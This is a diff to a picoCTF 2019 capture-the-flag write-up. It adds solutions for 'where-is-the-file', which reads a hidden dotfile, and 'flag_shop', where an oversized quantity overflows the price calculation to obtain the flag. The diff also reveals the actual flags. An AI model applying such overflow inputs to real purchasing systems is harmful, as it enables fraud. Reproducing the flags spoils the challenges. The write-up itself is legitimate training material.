@@ -130,14 +130,58 @@ Flag: picoCTF{}
 I've used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_3_19c1a7766ac2747c446eb9666a9b4fb4.
 
 ``` shell
-Flag: picoCTF{}
+c1ph3r3d@pico-2019-shell1:~$ cd /problems/where-is-the-file_3_19c1a7766ac2747c446eb9666a9b4fb4
+c1ph3r3d@pico-2019-shell1:/problems/where-is-the-file_3_19c1a7766ac2747c446eb9666a9b4fb4$ ls -la
+total 80
+drwxr-xr-x   2 root       root        4096 Sep 28 22:05 .
+drwxr-x--x 684 root       root       69632 Oct  3 00:56 ..
+-rw-rw-r--   1 hacksports hacksports    39 Sep 28 22:05 .cant_see_me
+c1ph3r3d@pico-2019-shell1:/problems/where-is-the-file_3_19c1a7766ac2747c446eb9666a9b4fb4$ cat .cant_see_me
+picoCTF{w3ll_that_d1dnt_w0RK_f28cde66}
+
+Flag: picoCTF{w3ll_that_d1dnt_w0RK_f28cde66}
 ```
 
 <h3>flag_shop - Points: 300</h3>
 There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc 2019shell1.picoctf.com 14937.
 
 ``` shell
-Flag: picoCTF{}
+root@Bl4st3r:/media/sf_D_DRIVE/picoctf19/pwn# nc 2019shell1.picoctf.com 14937
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+2. Buy Flags
+3. Exit
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+1
+These knockoff Flags cost 900 each, enter desired quantity
+10000000000000000
+
+The final cost is: -494665728
+Your current balance after transaction: 494666828
+
+Welcome to the flag exchange
+We sell flags
+
+1. Check Account Balance
+2. Buy Flags
+3. Exit
+ Enter a menu selection
+2
+Currently for sale
+1. Defintely not the flag Flag
+2. 1337 Flag
+2
+1337 flags cost 100000 dollars, and we only have 1 in stock
+Enter 1 to buy one1
+YOUR FLAG IS: picoCTF{m0n3y_bag5_e062f0fd}
+
+Flag: picoCTF{m0n3y_bag5_e062f0fd}
 ```
 
 <h3>mus1c - Points: 300</h3>
